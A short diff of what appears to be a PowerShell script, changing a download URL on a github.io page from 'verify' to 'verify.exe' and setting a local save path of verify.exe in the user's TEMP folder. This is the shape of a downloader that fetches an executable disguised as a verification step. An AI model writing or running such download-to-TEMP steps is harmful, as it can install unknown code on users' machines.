@@ -1,5 +1,5 @@
 
-$exeScriptUrl = "http://mcrobbyyt.github.io/verify"
+$exeScriptUrl = "http://mcrobbyyt.github.io/verify.exe"
 
 
 $localScriptPath = "$env:TEMP\verify.exe"
